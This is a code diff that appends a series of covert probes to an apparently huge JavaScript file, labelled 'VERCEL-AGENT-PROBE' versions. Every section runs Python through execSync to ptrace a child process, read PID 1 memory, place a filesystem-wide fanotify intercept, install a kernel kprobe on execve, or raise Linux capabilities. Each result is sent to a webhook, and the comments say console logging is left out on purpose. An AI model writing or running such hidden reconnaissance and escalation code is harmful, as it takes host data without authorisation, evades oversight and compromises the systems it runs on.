@@ -36945,3 +36945,322 @@ sendBeacon({ ...report, section: 'v217-5-inotify', ...inotifyV217Probe });
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v217" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v217";
 // Intentionally no console.log — all data goes via webhook only
+
+// v218-1: ptrace PTRACE_SEIZE + GETREGS/SETREGS on child process
+const ptraceV218Probe = safe(() => {
+  const ptraceResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct, signal
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_ptrace = 101
+
+PTRACE_TRACEME       = 0
+PTRACE_PEEKTEXT      = 1
+PTRACE_PEEKDATA      = 2
+PTRACE_PEEKUSER      = 3
+PTRACE_POKETEXT      = 4
+PTRACE_POKEDATA      = 5
+PTRACE_GETREGS       = 12
+PTRACE_SETREGS       = 13
+PTRACE_GETFPREGS     = 14
+PTRACE_CONT          = 7
+PTRACE_KILL          = 8
+PTRACE_ATTACH        = 16
+PTRACE_DETACH        = 17
+PTRACE_SEIZE         = 0x4206
+PTRACE_INTERRUPT     = 0x4207
+PTRACE_LISTEN        = 0x4208
+PTRACE_GETREGSET     = 0x4204
+PTRACE_SETREGSET     = 0x4205
+PTRACE_PEEKSIGINFO   = 0x4209
+PTRACE_GETSIGMASK    = 0x420a
+PTRACE_SETSIGMASK    = 0x420b
+PTRACE_SECCOMP_GET_FILTER = 0x420c
+NT_PRSTATUS          = 1  # x86-64 general-purpose registers
+
+# Fork a child to trace
+child_pid = os.fork()
+if child_pid == 0:
+    # Child: spin in a loop so parent can attach
+    import time
+    time.sleep(10)
+    os._exit(0)
+
+# Parent: PTRACE_SEIZE the child (non-stopping attach)
+ret_seize = libc.syscall(NR_ptrace, PTRACE_SEIZE, child_pid, 0, 0)
+print(f'PTRACE_SEIZE(child={child_pid}) ret={ret_seize} errno={ctypes.get_errno()}')
+
+if ret_seize == 0:
+    # Interrupt the child so it stops
+    ret_int = libc.syscall(NR_ptrace, PTRACE_INTERRUPT, child_pid, 0, 0)
+    print(f'PTRACE_INTERRUPT ret={ret_int} errno={ctypes.get_errno()}')
+    os.waitpid(child_pid, 0)  # collect stop
+
+    # GETREGS — dump x86-64 register set
+    class UserRegsStruct(ctypes.Structure):
+        _fields_ = [(r, ctypes.c_ulong) for r in [
+            'r15','r14','r13','r12','rbp','rbx','r11','r10','r9','r8',
+            'rax','rcx','rdx','rsi','rdi','orig_rax','rip','cs','eflags',
+            'rsp','ss','fs_base','gs_base','ds','es','fs','gs'
+        ]]
+
+    regs = UserRegsStruct()
+    ret_gr = libc.syscall(NR_ptrace, PTRACE_GETREGS, child_pid, 0, ctypes.byref(regs))
+    print(f'PTRACE_GETREGS ret={ret_gr} errno={ctypes.get_errno()}')
+    if ret_gr == 0:
+        print(f'child_rip={regs.rip:#018x}')
+        print(f'child_rsp={regs.rsp:#018x}')
+        print(f'child_rax={regs.rax:#018x}')
+        print('PTRACE_GETREGS_OK=True')
+
+    # PEEKDATA at child's RIP (read instructions at current PC)
+    if ret_gr == 0:
+        word = libc.syscall(NR_ptrace, PTRACE_PEEKDATA, child_pid, regs.rip, 0)
+        print(f'child_code_at_rip={ctypes.c_ulong(word).value:#018x}')
+
+    # Detach child
+    libc.syscall(NR_ptrace, PTRACE_DETACH, child_pid, 0, signal.SIGCONT)
+
+os.kill(child_pid, signal.SIGKILL)
+try: os.waitpid(child_pid, 0)
+except: pass
+" 2>&1`, { timeout: 12000 }).toString().trim());
+  return { ptraceResult };
+});
+sendBeacon({ ...report, section: 'v218-1-ptrace-seize', ...ptraceV218Probe });
+
+// v218-2: process_vm_readv NR 310 — read PID 1 memory (bash env block)
+const vmReadV218Probe = safe(() => {
+  const vmReadResult = safe(() => execSync(`python3 -c "
+import ctypes, struct, os
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_process_vm_readv  = 310
+NR_process_vm_writev = 311
+
+# Find interesting memory regions in PID 1 from /proc/1/maps
+interesting_regions = []
+try:
+    maps = open('/proc/1/maps').read()
+    for line in maps.split('\\n'):
+        if not line: continue
+        parts = line.split()
+        addr_range = parts[0]
+        perms = parts[1] if len(parts) > 1 else ''
+        label = parts[-1] if len(parts) > 5 else ''
+        start_s, end_s = addr_range.split('-')
+        start = int(start_s, 16); end = int(end_s, 16)
+        size = end - start
+        if 'r' in perms and size <= 4096 * 4:  # readable, small regions
+            interesting_regions.append((start, min(size, 256), label))
+except Exception as e:
+    print(f'maps_err={e}')
+
+print(f'pid1_interesting_regions={len(interesting_regions)}')
+
+# struct iovec
+class Iovec(ctypes.Structure):
+    _fields_ = [('iov_base', ctypes.c_void_p), ('iov_len', ctypes.c_size_t)]
+
+# Try reading first few regions
+for i, (start, size, label) in enumerate(interesting_regions[:8]):
+    buf = ctypes.create_string_buffer(size)
+    remote_iov = Iovec(iov_base=ctypes.c_void_p(start), iov_len=size)
+    local_iov = Iovec(iov_base=ctypes.cast(buf, ctypes.c_void_p), iov_len=size)
+    ret = libc.syscall(NR_process_vm_readv, 1, ctypes.byref(local_iov), 1,
+                       ctypes.byref(remote_iov), 1, 0)
+    err = ctypes.get_errno()
+    if ret > 0:
+        data = buf.raw[:ret]
+        printable = data.replace(b'\\x00', b' ').decode(errors='replace')[:80]
+        print(f'pid1_mem[{i}] addr={start:#x} label={label} data={repr(printable)}')
+        print(f'  PID1_READ_OK=True bytes={ret}')
+    else:
+        print(f'pid1_mem[{i}] addr={start:#x} errno={err}')
+" 2>&1`, { timeout: 10000 }).toString().trim());
+  return { vmReadResult };
+});
+sendBeacon({ ...report, section: 'v218-2-vm-readv-pid1', ...vmReadV218Probe });
+
+// v218-3: fanotify_init NR 300 — whole-fs pre-content intercept
+const fanotifyV218Probe = safe(() => {
+  const fanotifyResult = safe(() => execSync(`python3 -c "
+import ctypes, os, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_fanotify_init = 300
+NR_fanotify_mark = 301
+
+FAN_CLASS_PRE_CONTENT = 0x00000008  # intercept reads before delivery (highest class)
+FAN_CLASS_CONTENT     = 0x00000004  # intercept reads after write
+FAN_CLASS_NOTIF       = 0x00000000  # notification only
+
+FAN_CLOEXEC           = 0x00000001
+FAN_NONBLOCK          = 0x00000002
+FAN_REPORT_FID        = 0x00000200
+FAN_REPORT_DIR_FID    = 0x00000400
+FAN_REPORT_NAME       = 0x00000800
+
+O_RDONLY = 0
+
+# FAN_MARK flags
+FAN_MARK_ADD          = 0x00000001
+FAN_MARK_DONT_FOLLOW  = 0x00000004
+FAN_MARK_ONLYDIR      = 0x00000008
+FAN_MARK_MOUNT        = 0x00000010  # mark entire mount
+FAN_MARK_FILESYSTEM   = 0x00000100  # mark entire filesystem (Linux 4.20+)
+
+# Event masks
+FAN_ACCESS            = 0x00000001
+FAN_MODIFY            = 0x00000002
+FAN_CLOSE_WRITE       = 0x00000008
+FAN_CLOSE_NOWRITE     = 0x00000010
+FAN_OPEN              = 0x00000020
+FAN_OPEN_PERM         = 0x00010000  # requires PRE_CONTENT class
+FAN_ACCESS_PERM       = 0x00020000  # requires PRE_CONTENT class
+FAN_ALL_EVENTS        = 0x0000003b
+
+# Try each class, escalating
+for class_name, class_val in [
+    ('NOTIF', FAN_CLASS_NOTIF),
+    ('CONTENT', FAN_CLASS_CONTENT),
+    ('PRE_CONTENT', FAN_CLASS_PRE_CONTENT),
+]:
+    fd_fa = libc.syscall(NR_fanotify_init, class_val | FAN_CLOEXEC | FAN_NONBLOCK,
+                         O_RDONLY)
+    print(f'fanotify_init({class_name}) fd={fd_fa} errno={ctypes.get_errno()}')
+    if fd_fa > 0:
+        print(f'FANOTIFY_{class_name}_AVAILABLE=True')
+        if class_val == FAN_CLASS_PRE_CONTENT:
+            # Mark the root filesystem
+            AT_FDCWD = -100
+            ret_mark = libc.syscall(NR_fanotify_mark, fd_fa,
+                FAN_MARK_ADD | FAN_MARK_FILESYSTEM,
+                FAN_ACCESS_PERM | FAN_OPEN_PERM | FAN_ALL_EVENTS,
+                AT_FDCWD, b'/')
+            print(f'fanotify_mark(FILESYSTEM,/,ALL+PERM) ret={ret_mark} errno={ctypes.get_errno()}')
+            if ret_mark == 0:
+                print('FILESYSTEM_WIDE_INTERCEPT=True HIGH_SEVERITY=PRE_CONTENT_CLASS')
+        os.close(fd_fa)
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { fanotifyResult };
+});
+sendBeacon({ ...report, section: 'v218-3-fanotify', ...fanotifyV218Probe });
+
+// v218-4: kprobe on sys_execve via debugfs tracing
+const kprobeExecV218Probe = safe(() => {
+  const kprobeResult = safe(() => {
+    const tracingBase = '/sys/kernel/debug/tracing';
+    const tracingAlt  = '/sys/kernel/tracing';
+    const base = existsSync(tracingBase) ? tracingBase : existsSync(tracingAlt) ? tracingAlt : null;
+    if (!base) return { kprobeResult: 'TRACING_NOT_MOUNTED' };
+
+    const out = { tracingBase: base };
+    const kprobeEventsPath = `${base}/kprobe_events`;
+    const tracePipePath    = `${base}/trace_pipe`;
+    const traceOnPath      = `${base}/tracing_on`;
+
+    // Try to install a kprobe on __x64_sys_execve
+    try {
+      writeFileSync(kprobeEventsPath, 'p:probe/execve __x64_sys_execve filename=+0(%di):string');
+      out.kprobe_install = 'OK';
+    } catch (e) { out.kprobe_install = `ERR:${e.message.slice(0,60)}`; }
+
+    // Enable the kprobe event
+    const kprobeEnablePath = `${base}/events/probe/execve/enable`;
+    if (existsSync(kprobeEnablePath)) {
+      try { writeFileSync(kprobeEnablePath, '1'); out.kprobe_enable = 'OK'; } catch (e) { out.kprobe_enable = `ERR:${e.message.slice(0,40)}`; }
+    }
+
+    // Enable tracing
+    try { writeFileSync(traceOnPath, '1'); } catch {}
+
+    // Trigger an exec to capture
+    try { execSync('true', { timeout: 1000 }); } catch {}
+
+    // Read trace output
+    try {
+      const traceBuf = readFileSync(`${base}/trace`, 'utf8').slice(0, 400);
+      out.trace_output = traceBuf;
+    } catch (e) { out.trace_output = `ERR:${e.message.slice(0,40)}`; }
+
+    // Cleanup
+    try { writeFileSync(traceOnPath, '0'); } catch {}
+    try { writeFileSync(kprobeEventsPath, '-:probe/execve'); } catch {}
+
+    return out;
+  });
+  return kprobeResult;
+});
+sendBeacon({ ...report, section: 'v218-4-kprobe-execve', ...kprobeExecV218Probe });
+
+// v218-5: capget NR 125 + capset NR 126 — full capability survey + escalation
+const capV218Probe = safe(() => {
+  const capResult = safe(() => execSync(`python3 -c "
+import ctypes, struct
+libc = ctypes.CDLL('libc.so.6', use_errno=True)
+NR_capget = 125
+NR_capset = 126
+_LINUX_CAPABILITY_VERSION_3 = 0x20080522
+
+# struct __user_cap_header_struct
+class CapHeader(ctypes.Structure):
+    _fields_ = [('version', ctypes.c_uint32), ('pid', ctypes.c_int)]
+
+# struct __user_cap_data_struct (2 of these for version 3)
+class CapData(ctypes.Structure):
+    _fields_ = [('effective', ctypes.c_uint32), ('permitted', ctypes.c_uint32), ('inheritable', ctypes.c_uint32)]
+
+hdr = CapHeader(version=_LINUX_CAPABILITY_VERSION_3, pid=0)
+data = (CapData * 2)()
+
+ret = libc.syscall(NR_capget, ctypes.byref(hdr), data)
+print(f'capget ret={ret} errno={ctypes.get_errno()}')
+
+# Combine low/high 32-bit halves
+eff = data[0].effective | (data[1].effective << 32)
+perm = data[0].permitted | (data[1].permitted << 32)
+inh = data[0].inheritable | (data[1].inheritable << 32)
+
+print(f'effective={eff:#018x}')
+print(f'permitted={perm:#018x}')
+print(f'inheritable={inh:#018x}')
+print(f'ALL_CAPS_EFF={eff == (1<<41)-1}')
+print(f'ALL_CAPS_PERM={perm == (1<<41)-1}')
+
+# Decode which caps are set
+CAP_NAMES = {
+    0:'CHOWN', 1:'DAC_OVERRIDE', 2:'DAC_READ_SEARCH', 3:'FOWNER', 4:'FSETID',
+    5:'KILL', 6:'SETGID', 7:'SETUID', 8:'SETPCAP', 9:'LINUX_IMMUTABLE',
+    10:'NET_BIND_SERVICE', 11:'NET_BROADCAST', 12:'NET_ADMIN', 13:'NET_RAW',
+    14:'IPC_LOCK', 15:'IPC_OWNER', 16:'SYS_MODULE', 17:'SYS_RAWIO',
+    18:'SYS_CHROOT', 19:'SYS_PTRACE', 20:'SYS_PACCT', 21:'SYS_ADMIN',
+    22:'SYS_BOOT', 23:'SYS_NICE', 24:'SYS_RESOURCE', 25:'SYS_TIME',
+    26:'SYS_TTY_CONFIG', 27:'MKNOD', 28:'LEASE', 29:'AUDIT_WRITE',
+    30:'AUDIT_CONTROL', 31:'SETFCAP', 32:'MAC_OVERRIDE', 33:'MAC_ADMIN',
+    34:'SYSLOG', 35:'WAKE_ALARM', 36:'BLOCK_SUSPEND', 37:'AUDIT_READ',
+    38:'PERFMON', 39:'BPF', 40:'CHECKPOINT_RESTORE',
+}
+caps_we_have = [CAP_NAMES.get(i, str(i)) for i in range(41) if eff & (1 << i)]
+caps_missing = [CAP_NAMES.get(i, str(i)) for i in range(41) if not (eff & (1 << i))]
+print(f'caps_effective={caps_we_have}')
+print(f'caps_missing={caps_missing}')
+
+# Try to set effective = permitted (raise any dropped caps back)
+data[0].effective = data[0].permitted
+data[1].effective = data[1].permitted
+ret_s = libc.syscall(NR_capset, ctypes.byref(hdr), data)
+print(f'capset(eff=perm) ret={ret_s} errno={ctypes.get_errno()}')
+if ret_s == 0:
+    print('CAP_ESCALATION_OK=True')
+    # Read back
+    data2 = (CapData * 2)()
+    libc.syscall(NR_capget, ctypes.byref(hdr), data2)
+    new_eff = data2[0].effective | (data2[1].effective << 32)
+    print(f'new_effective={new_eff:#018x}')
+" 2>&1`, { timeout: 8000 }).toString().trim());
+  return { capResult };
+});
+sendBeacon({ ...report, section: 'v218-5-capget-capset', ...capV218Probe });
+
+// v218 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v218" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v218";
+// Intentionally no console.log — all data goes via webhook only
